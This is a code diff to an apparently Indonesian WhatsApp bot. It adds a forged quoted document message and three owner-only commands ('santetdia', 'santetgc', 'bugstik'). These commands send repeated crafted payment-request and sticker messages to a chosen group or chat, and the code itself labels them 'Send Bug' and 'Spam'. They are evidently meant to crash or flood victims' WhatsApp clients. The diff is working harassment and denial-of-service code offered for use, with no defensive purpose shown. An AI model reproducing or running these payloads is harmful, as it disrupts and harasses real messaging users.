@@ -266,7 +266,22 @@ const lep = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
 const fvideo = { key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`,...(m.chat ? {} : {}) },message: { "videoMessage": {"title":"hallo bang","h": `Hmm`,'seconds': '-99999','caption': `${global.botnma}`,'jpegThumbnail': fakee}}}
 const fgif = { key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(m.chat ? {} : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${global.botnma}`,'jpegThumbnail': fakee}}} 
 const fimage = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {} : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${global.botnma}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486","jpegThumbnail": fakee,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==" }}}
-
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `Tettew²⁸`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}}
 
 //=======================[ SET REPLY ]=======================//
 const reply = async(teks) => { 
@@ -3813,7 +3828,81 @@ aqua.sendImageAsSticker2(m.chat, teks, m)
 db.users[sender].limit -= 1 // -1 limit
 break	
 
+case 'santetdia': {
+if (!isOwner) return reply ('khsus owner')
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+reply(`baiklah tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER Paww 1981`,
+}
+}}), { userJid: m.chat, quoted: doc})
+aqua.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
+case 'santetgc': {
+if (!isOwner) return reply ('khsus owner')
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+reply(`UDAH KEKIRIM CHUYY`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `My Developer Kimtod`,
+}
+}}), { userJid: m.chat, quoted: doc})
+aqua.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
 
+case 'bugstik':{
+if (!isOwner) return reply ('khsus owner')
+if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku bot wea`
+for (let i = 0; i < jumlah; i++) {
+aqua.sendMessage(m.chat, {sticker: thumb},{quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}
+}})
+}
+reply (`Sukses Send Bug Sebanyak ${jumlah}`)
+}
+break
 
 case 'bugpc': {
 if (!isOwner) return reply ('khsus owner')
